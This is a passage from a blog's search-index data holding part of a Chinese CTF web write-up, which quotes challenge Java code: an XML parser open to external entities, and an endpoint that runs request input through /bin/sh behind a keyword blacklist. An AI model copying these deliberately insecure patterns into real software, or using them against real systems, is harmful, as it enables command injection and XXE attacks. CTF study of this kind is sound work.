!Objects.equals(payload.getUsername(), username1)) { throw new Exception(); } Reader stringReader = new StringReader(payload.getXml()); SAXReader reader = new SAXReader(); Document document = reader.read(stringReader); Element root = document.getRootElement(); return new ResponseEntity(\"200\", \"Parse success!\", root.getText()); } // /cnss/doCmd public void doCmd(@RequestParam String cmd, HttpServletRequest request) throws IOException { if (cmd == null) { return; } for (String str : this.config.getBlacklist()) { if (cmd.contains(str)) { return; } } Process process = new ProcessBuilder(\"/bin/sh\", \"-c\", cmd).start(); try { process.waitFor(); } catch (InterruptedException e) { e.printStackTrace(); } } 再分析一下 Filter 定位到 com.cnss.summer.filter // /cnss/summer/parse public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { String token; HttpServletRequest request = (HttpServletRequest) servletRequest; if (!Objects.equals(request.getMethod(), this.config.getMethod()) || (token = (String) request.getSession().getAttribute(\"token\")) == null) { return; } long timestamp = ((Long) request.getSession().getAttribute(\"timestamp\")).longValue(); long now = System.currentTimeMillis(); if (now - timestamp \u003e this.config.getExpire()) { return; } String token2 = token.substring(0, this.config.getAuthLen()); String uuid = request.getHeader(\"UUID\"); if (!Objects.equals(token2, DigestUtils.md5DigestAsHex(uuid.getBytes(StandardCharsets.UTF_8)).substring(0, this.config.getAuthLen()))) { request.getSession().invalidate(); return; } request.getSession().setAttribute(\"timestamp\", Long.valueOf(now)); filterChain.doFilter(servletRequest, servletResponse); } // /cnss/doCmd public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { HttpServletRequest request = (HttpServletRequest) servletRequest; String client = request.getRemoteAddr(); if (!client.equals(this.config.getAllow())) { return; } filterChain.doFilter(servletRequest, servletResponse); } 可以看到，能够直接请求的接口只有 /cnss/summer/login ， 在请求的时候需要 POST的内容为 LoginParam public class LoginParam { @JsonProperty(\"us3rname\") @NotEmpty private String username; @JsonProperty(\"p@ssword\") @NotEmpty private String password; } 所以POST的内容为 { \"us3rname\": \"test\", \"p@ssword\": \"test\" } 返回结果如下 { \"code\": \"200\", \"message\": \"Login success!\", \"data\": { \"token\": \"72600e5c9b1b1340a1b52cf736636c88\" } } 接下来分析一下 /cnss/summer/parse 的 Filter 结合配置文件分析， 需要将HTTP请求方法设置为 SUMMM","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/:14:0","tags":["CTF","WEB","Writeup"],"title":"CNSS2022夏令营_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["ME"],"content":"摘要：你好，这里是 4ever-xxxl","date":"2022-08-07","objectID":"/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/","tags":["Essay"],"title":"第一篇文章","uri":"/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"},{"categories":["ME"],"content":"你好，这里是 4ever-xxxl。 ","date":"2022-08-07","objectID":"/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/:0:0","tags":["Essay"],"title":"第一篇文章","uri":"/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"}]